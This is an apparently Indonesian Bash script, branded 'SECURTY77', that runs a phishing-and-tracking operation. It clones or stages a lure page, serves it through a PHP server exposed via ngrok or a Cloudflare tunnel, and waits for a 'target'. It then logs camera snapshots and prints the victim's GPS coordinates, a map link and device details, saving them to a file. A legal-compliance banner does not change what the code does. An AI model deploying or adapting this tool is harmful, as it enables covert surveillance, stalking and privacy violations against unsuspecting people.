pu='\033[1;35m'   # Purple bold
ij='\033[1;36m'   # Cyan bold
hi='\033[1;33m'   # Yellow bold
rs='\033[0m'      # Reset

# ── Lebar area di dalam border ──
W=60

rm -rf server/redirect.php
rm -rf server/index.php
rm -rf server/geolocate.txt
rm -rf server/camera.log
line() {
    local plain="$1"
    local colored="$2"
    local len=${#plain}
    local total=$(( W - len ))
    local left=$(( total / 2 ))
    local right=$(( total - left ))
    printf "\t\t║%*s%b%*s║\n" "$left" "" "$colored" "$right" ""
}

# ── Baris kosong di dalam border ──
empty() {
    printf "\t\t║%*s║\n" "$W" ""
}

# ── Cetak banner ──
printf "\t\t╔"; printf '═%.0s' $(seq 1 $W); printf "╗\n"

line "Author : Hedy"                                        "${pu}Author : Hedy${rs}"
line "Tiktok : hedy_77"                                     "${ij}Tiktok : hedy_77${rs}"
empty

line "Peringatan: Penggunaan script ini harus mentaati" \
     "${hi}Peringatan: Penggunaan script ini harus mentaati${rs}"

line "Undang-Undang Nomor 27 Tahun 2022 tentang Pelindungan" \
     "${hi}Undang-Undang Nomor 27 Tahun 2022 tentang Pelindungan${rs}"

line "Data Pribadi (UU PDP) serta UU Informasi dan Transaksi" \
     "${hi}Data Pribadi (UU PDP) serta UU Informasi dan Transaksi${rs}"

line "Elektronik (UU ITE)." \
     "${hi}Elektronik (UU ITE).${rs}"

empty
printf "\t\t╚"; printf '═%.0s' $(seq 1 $W); printf "╝\n"

read 
clear

echo -e "\033[0;37m                                     \033[0;34m█\033[0;36;44m▓\033[0;94;44m▄▄\033[0;36;44m▀▄\033[0;34m▄▄\033[0;37m                                   \033[0m"
echo -e "\033[0;37m  \033[0;34m▄▄▄\033[0;37m    \033[0;34m▄▄▄\033[0;37m    \033[0;34m▄▄▄\033[0;37m                 \033[0;34m▄\033[0;37m \033[0;34m▀\033[0;94;44m▀\033[0;34m▀▐\033[0;94;46m \033[0;94;44m█▌\033[0;34m▄▄\033[0;37m   \033[0;34m▄\033[0;37m \033[0;34m▄\033[0;37m        \033[0;34m▄▄▄\033[0;37m    \033[0;34m▄\033[0;37m \033[0;34m▄\033[0;37m    \033[0;34m▄▄▄\033[0;37m  \033[0m"
echo -e "\033[0;34m▄\033[0;36;44m▄\033[0;94;46m▄▄\033[0;94;44m█▄\033[0;34m▌▄\033[0;36;44m▄\033[0;94;46m▄▄\033[0;94;44m█▄\033[0;34m▌▄\033[0;36;44m▄\033[0;94;46m▄▄\033[0;94;44m█▄\033[0;34m▌█\033[0;36;44m▄\033[0;94;44m▄\033[0;34m▌█\033[0;36;44m▄\033[0;94;44m▄\033[0;34m▌▐\033[0;36;44m▄\033[0;94;44m▄▄▄▄\033[0;34m▄▐\033[0;36;44m▄▄\033[0;34m▄\033[0;37m \033[0;34m▐\033[0;94;46m \033[0;94;44m█▀▀▀\033[0;34m▀▐\033[0;36;44m▄\033[0;94m█\033[0;34m▌\033[0;94;44m▐▄\033[0;34m▄\033[0;37m    \033[0;34m▄\033[0;36;44m▄\033[0;94;46m▄▄\033[0;94;44m█▄\033[0;34m▌▐\033[0;36;44m▄\033[0;94m█\033[0;34m▌\033[0;94;44m▐▄\033[0;34m▄▄\033[0;36;44m▄\033[0;94;46m▄▄\033[0;94;44m█▄\033[0;34m▌\033[0m"
echo -e "\033[0;36;44m▐\033[0;94;44m█▄▄▄▄\033[0;34m█\033[0;36;44m▐\033[0;94;44m█▌\033[0;94m▄\033[0;34m▄\033[0;94;44m▀\033[0;34m▀\033[0;36;44m▐\033[0;94;44m█▌\033[0;34m▀▄\033[0;94;44m▀\033[0;34m▀\033[0;36;44m▐\033[0;94;46m▐█\033[0;34m▌█\033[0;94;46m▐\033[0;94;44m█\033[0;34m▌▐\033[0;94;46m▐\033[0;94m█\033[0;34m█▀\033[0;94;44m▀\033[0;34m▀▐\033[0;36;44m█\033[0;94;44m██\033[0;34m▌▐\033[0;94;46m \033[0;94;44m█▌\033[0;37m \033[0;94;44m▄\033[0;34m▌▐\033[0;94;46m▐\033[0;94m█\033[0;34m▄\033[0;94;44m▐█▌\033[0;37m    \033[0;36;44m▐\033[0;94;44m█▌\033[0;94m▄\033[0;34m▄\033[0;94;44m▀\033[0;34m▀▐\033[0;94;46m▐\033[0;94m█\033[0;34m▄\033[0;94;44m▐█▌\033[0;36;44m▐\033[0;94;44m█▌\033[0;94m▄\033[0;34m▄\033[0;94;44m▀\033[0;34m▀\033[0m"
echo -e "\033[0;30;44m░\033[0;94;44m▄▄▄▄▀\033[0;34m▀\033[0;30;44m░\033[0;94;44m▀\033[0;94m█▄▄\033[0;34m▄\033[0;37m \033[0;30;44m░\033[0;94;44m▀▀▀▀▀\033[0;34m▌▀\033[0;36;44m▀\033[0;94;44m▀▀▀\033[0;36;44m▀\033[0;94;44m▀\033[0;34m▌▐\033[0;36;44m▀\033[0;94;44m▀\033[0;34m▌\033[0;37m   \033[0;30;44m▒\033[0;36;44m▀▀\033[0;94;44m▀\033[0;34m▌\033[0;36;44m▀▀\033[0;94;44m▀▀▀▀\033[0;34m▌\033[0;37m \033[0;34m▄\033[0;94;44m▀▀▀█▌\033[0;37m    \033[0;30;44m░\033[0;94;44m▀\033[0;94m█▄▄\033[0;34m▄\033[0;37m  \033[0;34m▄\033[0;94;44m▀▀▀█▌\033[0;30;44m░\033[0;94;44m▀\033[0;94m█▄▄\033[0;34m▄\033[0;37m \033[0m"
echo -e "\033[0;37m                                                \033[0;34m▀\033[0;36;44m▀\033[0;94;44m▄▀▀▀\033[0;34m▀\033[0;37m           \033[0;34m▀\033[0;36;44m▀\033[0;94;44m▄▀▀▀\033[0;34m▀\033[0;37m       \033[0m"


loadgps(){
    echo "[+] Waiting Target......."
    while [ true ]; do
    
    if [ -e "server/geolocate.txt" ]; then
    echo "[+] Geolocation Found......."
    echo 
    echo "[!] Ketik CTRL + C untuk stop.!!"
    gps
    fi
    done



}
gps() {
    local file="server/geolocate.txt"

    # ── Cek file ada ──
    if [ ! -f "$file" ]; then
        echo "[!] File $file tidak ditemukan."
        return 1
    fi

    # ── Baca file SEKALI, isi ke associative array ──
    declare -A D
    while IFS= read -r line; do
        # Ambil bagian setelah ':' lalu rapikan spasi
        key=$(echo "$line" | awk -F: '{print $1}' | sed 's/[[:space:]]*$//')
        val=$(echo "$line" | cut -d: -f2- | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [ -n "$key" ] && D["$key"]="$val"
    done < "$file"

    # ── Helper untuk cetak baris label : nilai ──
    row() {
        printf "  %-12s : %s\n" "$1" "$2"
    }

    # ── Simpan variabel ──
    local lat="${D[Latitude]}"
    local long="${D[Longitude]}"
    local alti="${D[Altitude]}"
    local acc="${D[Accuracy]}"
    local speed="${D[Speed]}"
    local head="${D[Heading]}"
    local plat="${D[Platform]}"
    local core="${D[Cores]}"
    local memo="${D[Memory]}"
    local batt="${D[Battery]}"

    # ── Screen: pisahkan Height / Width dari nilai berformat "1920 x 1080" ──
    local sh="${D[Screen Height]}"
    local sw="${D[Screen Width]}"

    echo

    # ── GEOLOCATION ──
    echo "============================================"
    echo "  GEOLOCATION"
    echo "============================================"
    row "Latitude"  "$lat"
    row "Longitude" "$long"
    row "Altitude"  "$alti"
    row "Heading"   "$head"
    row "Speed"     "$speed"
    row "Accuracy"  "$acc"
    row "Map"       "https://www.google.com/maps/place/$lat+$long"
    echo

    # ── DEVICE INFO ──
    echo "============================================"
    echo "  DEVICE INFO"
    echo "============================================"
    row "Memory"     "$memo"
    row "Cores"      "$core"
    row "Platform"   "$plat"
    row "Resolution" "${sw:-?} x ${sh:-?}"
    row "Battery"    "${batt}%"
    echo "============================================"
    echo

    # ── Simpan log ──
    echo "  [+] Data disimpan ke: locad.txt"
    cat "$file" >> locad.txt
    rm -f "$file"
}



menunggu(){
    LOG="server/camera.log"

# ── Format 1 baris log jadi rapi ──
format_log() {
    local line="$1"
    local ts req img

    # Coba ekstrak tiap komponen dari baris asli
    ts=$(grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' <<< "$line" | head -1)
    req=$(grep -oE '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}(-[0-9]+)?' <<< "$line" | head -1)
    img=$(grep -oE '[0-9]{8}_[0-9]{6}_[a-zA-Z0-9._-]+\.(png|jpg|jpeg)' <<< "$line" | head -1)

    # Kalau timestamp tidak ada, ambil dari nama file image
    # contoh: 20261008_103122_xxxx.png → 2026-10-08 10:31:22
    if [ -z "$ts" ] && [ -n "$img" ]; then
        local d="${img:0:8}" t="${img:9:6}"
        ts="${d:0:4}-${d:4:2}-${d:6:2} ${t:0:2}:${t:2:2}:${t:4:2}"
    fi
    [ -z "$ts" ]  && ts=$(date '+%Y-%m-%d %H:%M:%S')
    [ -z "$req" ] && req="-"
    [ -z "$img" ] && img="-"

    printf "%-19s | request_id=%-42s | image=%s\n" "$ts" "$req" "$img"
}

# ── Tampilkan seluruh isi camera.log dengan rapi ──
uoutput() {
    echo
    echo "=============================================================================="
    printf "%-19s | %-42s | %s\n" "WAKTU" "REQUEST_ID" "IMAGE"
    echo "=============================================================================="
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        format_log "$line"
    done < "$LOG"
    echo "=============================================================================="
    echo
    loadgps
}

# ── Loop utama ──
rm -f "$LOG"
echo "[+] Menunggu target..."
while true; do
    if [ -e "$LOG" ]; then
        echo "[+] Target mengaktifkan kamera"
        echo "[!] Tekan CTRL+C untuk stop"
        uoutput
        break
    fi
    sleep 1   # penting: hindari busy-loop 100% CPU
done

}

gass(){

    # ── Tanya port ──
    read -p "Masukkan port yang ingin dipakai [default 3333]: " port
    port="${port:-3333}"

    # ── Validasi port ──
    if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        echo "[!] Port tidak valid. Gunakan angka 1-65535."
        return 1
    fi

    # ── Pastikan folder server ada ──
    if [ ! -d "server" ]; then
        echo "[!] Folder 'server' tidak ditemukan."
        return 1
    fi

    # ── Cek dependensi ──
    for cmd in php ngrok curl jq; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo "[!] '$cmd' tidak terinstall."
            return 1
        fi
    done

    # ── Start PHP server ──
    echo "[+] Menjalankan PHP server di port $port..."
    php -t "server/" -S 0.0.0.0:"$port" > /dev/null 2>&1 &
    php_pid=$!
    sleep 1

    # ── Start ngrok ──
    echo "[+] Menjalankan Ngrok tunnel..."
    ngrok http "$port" > /dev/null 2>&1 &
    ngrok_pid=$!
    sleep 3

    # ── Ambil URL publik ──
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')

    if [ -z "$link" ] || [ "$link" = "null" ]; then
        echo "[!] Gagal mengambil link dari ngrok. Cek dashboard: http://127.0.0.1:4040"
        return 1
    fi

    # ── Tampilkan hasil ──
    echo
    echo "========================================"
    echo "  Link publik : $link"
    echo "  PHP  PID    : $php_pid"
    echo "  Ngrok PID   : $ngrok_pid"
    echo "========================================"
    echo
    sleep 3
    menunggu
}


module(){
    cat server/verifikasi.php >> server/index.php
    read -p " [!]Redirect: " ur
    [ -z "$ur" ] && { echo "[!] URL kosong."; exit 1; }
    echo "<html><head><script>setTimeout(function(){window.location.href='$ur';}, 1500);</script></head><body></body></html>" >> server/redirect.php
    ngrokok
}

cftunnel() {
    # ── Tanya port (bisa lewat argumen atau input) ──
    local port="${1:-}"
    if [ -z "$port" ]; then
        read -p "Masukkan port yang ingin dipakai [default 3333]: " port
        port="${port:-3333}"
    fi

    # ── Validasi port ──
    if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        echo "[!] Port tidak valid. Gunakan angka 1-65535."
        return 1
    fi

    # ── Pastikan folder server ada ──
    if [ ! -d "server" ]; then
        echo "[!] Folder 'server' tidak ditemukan."
        return 1
    fi

    # ── Cek dependensi ──
    for cmd in php cloudflared curl jq; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo "[!] '$cmd' tidak terinstall."
            return 1
        fi
    done

    local log="/tmp/cf_tunnel.log"
    : > "$log"   # kosongkan log lama

    # ── Start PHP server ──
    echo "[+] Menjalankan PHP server di port $port..."
    php -t "server/" -S 0.0.0.0:"$port" > /dev/null 2>&1 &
    local php_pid=$!
    sleep 1

    # ── Start Cloudflare Quick Tunnel ──
    echo "[+] Menjalankan Cloudflare Quick Tunnel..."
    cloudflared tunnel --url "http://localhost:$port" > "$log" 2>&1 &
    local cf_pid=$!

    # ── Tunggu tunnel siap (polling, max ~20 detik) ──
    echo "[+] Menunggu tunnel siap..."
    local public_url=""
    local i
    for i in $(seq 1 20); do
        # Metode 1: parse URL dari log
        public_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$log" | head -1)

        # Metode 2: query metrics port
        if [ -z "$public_url" ]; then
            local metrics_addr
            metrics_addr=$(grep -oE '127\.0\.0\.1:[0-9]+' "$log" | head -1)
            if [ -n "$metrics_addr" ]; then
                public_url=$(curl -s "http://$metrics_addr/quicktunnel" | jq -r '.hostname // empty')
            fi
        fi

        [ -n "$public_url" ] && break
        sleep 1
    done

    # ── Tampilkan hasil ──
    echo
    if [ -n "$public_url" ] && [ "$public_url" != "null" ]; then
        echo "========================================"
        echo "  Link publik : $public_url"
        echo "  PHP  PID    : $php_pid"
        echo "  CF   PID    : $cf_pid"
        echo "========================================"
        echo
        echo "  Stop dengan : kill $php_pid $cf_pid"
        menunggu
    else
        echo "[!] Gagal mendapatkan URL setelah 20 detik."
        echo "    Cek log: $log"
        echo "    PHP  PID : $php_pid"
        echo "    CF   PID : $cf_pid"
    fi
}
ngrokok(){
    echo "  ----------------------------------------"
    echo
    echo "    [1]  Ngrok"
    echo "    [2]  Cloudflare"
    echo "    [3]  Exit Programs"
    echo
    echo "  ----------------------------------------"
    echo
    read -p "  root@track(Default)-> " pill1
    echo

    case "$pill1" in
        1)
            echo "  [OK] Menjalankan Ngrok..."
            echo
            gass
            ;;
        2)
            echo "  [OK] Menjalankan Cloudflare..."
            echo
            cftunnel
            ;;
        3)
            echo "  [OK] Keluar dari program. Sampai jumpa..."
            echo
            exit 0
            ;;
        "")
            echo "  [!] Input kosong. Silakan pilih 1-3."
            echo
            ngrokok
            ;;
        *)
            echo "  [!] '$pill1' bukan pilihan valid. Gunakan 1-3."
            echo
            ngrokok
            ;;
    esac
}

cln(){
    rm -rf server/no.php

    read -p " [!] Clone: " clone
    wget $clone --no-check-certificate -O server/no.php -c -k -U "Mozilla/5.0 (Linux; Android 9; TA-1032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36" > /dev/null 2>&1
    echo '<html><script>setTimeout(function(){window.location.href="verifikasi.php";}, 10000);</script><html>' >>  server/om.php
    echo "<html><head><script>setTimeout(function(){window.location.href='$clone';}, 1500);</script></head><body></body></html>" >> server/redirect.php
    cat server/no.php >> server/index.php 
    cat server/om.php >> server/index.php 
    ngrokok

}



pill() {
    echo
    echo "        S E C U R T Y 7 7"
    echo
    echo "     by Hedy | tiktok: @hedy_77"
    echo
    echo "  ----------------------------------------"
    echo
    echo "    [1]  Clone Website"
    echo "    [2]  Default"
    echo "    [3]  Exit Programs"
    echo
    echo "  ----------------------------------------"
    echo
    read -p "  root@track-> " pillck
    echo

    case "$pillck" in
        1)
            echo "  [OK] Menjalankan Clone Website..."
            echo
            cln
            ;;
        2)
            echo "  [OK] Menjalankan Default..."
            echo
            module
            ;;
        3)
            echo "  [OK] Keluar dari program. Sampai jumpa..."
            echo
            exit 0
            ;;
        "")
            echo "  [!] Input kosong. Silakan pilih 1-3."
            echo
            pill
            ;;
        *)
            echo "  [!] '$pillck' bukan pilihan valid. Gunakan 1-3."
            echo
            pill
            ;;
    esac
}


pill